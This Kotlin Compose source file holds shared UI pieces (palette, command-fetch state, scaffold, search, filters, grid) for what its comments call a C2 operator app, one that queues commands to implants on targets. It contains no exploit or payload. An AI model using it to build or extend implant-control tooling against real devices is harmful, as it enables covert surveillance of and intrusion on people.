package com.shadow.operator.ui.cap

import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ArrowBack
import androidx.compose.material.icons.filled.Search
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.ImeAction
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.shadow.operator.data.RpcClient
import kotlinx.coroutines.launch

// Capability-screen palette. Kept file-public in this package rather than
// widening ui.theme, which other screens already tune independently.
val CapBg = Color(0xFF0A0E14)
val CapSurface = Color(0xFF131A24)
val CapBorder = Color(0xFF22303F)
val CapText = Color(0xFFD9E1EC)
val CapBright = Color(0xFFF2F6FA)
val CapDim = Color(0xFF8892A4)
val CapFaint = Color(0xFF66707F)
val CapGreen = Color(0xFF00E676)
val CapBlue = Color(0xFF2979FF)
val CapAmber = Color(0xFFFFAB00)
val CapPurple = Color(0xFFAA00FF)
val CapRed = Color(0xFFFF1744)

/** Fetch state for a capability screen. */
class CapLoad(
    val command: String,
    val payload: String = "{}",
    val parseRows: Boolean = true,
) {
    var loading by mutableStateOf(true)
        private set
    var raw by mutableStateOf("")
        private set
    var error by mutableStateOf<String?>(null)
        private set
    /** Milliseconds of the last round trip; operators judge a C2 by this. */
    var tookMs by mutableStateOf(0L)
        private set

    fun table() = com.shadow.operator.data.DataTable.parse(command, raw)

    suspend fun run(rpc: RpcClient) {
        // Recorded so a timeout can name the identity the call used. Note the
        // deliberate fallthrough to OperatorConfig's default, so a blank selection is
        // legitimate on a single-target build -- we report it, we do not block it.
        val target = rpc.activeTarget
        loading = true
        error = null
        val t0 = System.currentTimeMillis()
        val out = rpc.execute(command, payload, 90000)
        tookMs = System.currentTimeMillis() - t0
        raw = out
        // RpcClient.display() prefixes failures with ERROR/NO RESULT; surface those
        // as errors so a screen never renders a failure as empty data.
        error = when {
            out.startsWith("ERROR") -> out
            // Name the target so a stale selection is visible instead of looking
            // like a slow screen: the command is sitting in that implant's queue.
            out.startsWith("NO RESULT") -> "$out (target ${target.take(8)})"
            else -> null
        }
        loading = false
    }
}

/**
 * Scaffold shared by every capability screen: title with live subtitle (row
 * count, latency), refresh action, and consistent empty/error states.
 */
@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun CapabilityScreen(
    title: String,
    subtitle: String,
    onBack: () -> Unit,
    loading: Boolean,
    onRefresh: () -> Unit,
    accent: Color = CapGreen,
    actions: @Composable RowScope.() -> Unit = {},
    content: @Composable ColumnScope.() -> Unit,
) {
    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Column {
                        Text(title, color = CapBright, fontWeight = FontWeight.SemiBold,
                            fontFamily = FontFamily.Monospace, fontSize = 17.sp)
                        Text(
                            if (loading) "running…" else subtitle,
                            color = if (loading) CapAmber else CapDim,
                            fontFamily = FontFamily.Monospace,
                            fontSize = 11.sp
                        )
                    }
                },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.Default.ArrowBack, "Back", tint = CapText)
                    }
                },
                actions = {
                    actions()
                    IconButton(onClick = onRefresh, enabled = !loading) {
                        Icon(Icons.Default.Refresh, "Refresh",
                            tint = if (loading) CapFaint else accent)
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(containerColor = CapSurface)
            )
        },
        containerColor = CapBg
    ) { pd ->
        Column(Modifier.padding(pd).fillMaxSize()) { content() }
    }
}

@Composable
fun CapSearch(query: String, onChange: (String) -> Unit, placeholder: String) {
    OutlinedTextField(
        value = query,
        onValueChange = onChange,
        modifier = Modifier.fillMaxWidth().padding(horizontal = 12.dp, vertical = 6.dp),
        placeholder = { Text(placeholder, color = CapFaint, fontSize = 13.sp) },
        leadingIcon = { Icon(Icons.Default.Search, null, tint = CapFaint) },
        textStyle = LocalTextStyle.current.copy(color = CapText, fontSize = 14.sp),
        singleLine = true,
        keyboardOptions = KeyboardOptions(imeAction = ImeAction.Search),
        colors = OutlinedTextFieldDefaults.colors(
            focusedBorderColor = CapGreen,
            unfocusedBorderColor = CapBorder,
            cursorColor = CapGreen
        )
    )
}

@Composable
fun CapMessage(text: String, tone: Color = CapFaint) {
    Box(Modifier.fillMaxSize().padding(24.dp), contentAlignment = Alignment.Center) {
        Text(text, color = tone, fontSize = 13.sp, fontFamily = FontFamily.Monospace)
    }
}

/** Simple horizontal filter chips (All / user / system, call types, …). */
@Composable
fun CapFilters(options: List<String>, selected: String, onPick: (String) -> Unit) {
    Row(
        Modifier.fillMaxWidth().horizontalScroll(rememberScrollState())
            .padding(horizontal = 12.dp, vertical = 6.dp),
        horizontalArrangement = Arrangement.spacedBy(8.dp)
    ) {
        options.forEach { opt ->
            val on = opt == selected
            Surface(
                color = if (on) CapGreen.copy(alpha = 0.16f) else CapSurface,
                modifier = Modifier.clickable { onPick(opt) }
            ) {
                Text(
                    opt,
                    color = if (on) CapGreen else CapDim,
                    fontSize = 12.sp,
                    fontFamily = FontFamily.Monospace,
                    modifier = Modifier.padding(horizontal = 12.dp, vertical = 6.dp)
                )
            }
        }
    }
}

@Composable
fun KeyValueGrid(pairs: List<Pair<String, String>>) {
    Column(
        Modifier.fillMaxWidth().verticalScroll(rememberScrollState()).padding(12.dp),
        verticalArrangement = Arrangement.spacedBy(6.dp)
    ) {
        pairs.chunked(2).forEach { rowPair ->
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                rowPair.forEach { (k, v) ->
                    Surface(color = CapSurface, modifier = Modifier.weight(1f)) {
                        Column(Modifier.padding(10.dp)) {
                            Text(k.uppercase(), color = CapFaint, fontSize = 10.sp,
                                fontFamily = FontFamily.Monospace)
                            Text(v, color = CapText, fontSize = 13.sp,
                                fontFamily = FontFamily.Monospace)
                        }
                    }
                }
                if (rowPair.size == 1) Spacer(Modifier.weight(1f))
            }
        }
    }
}
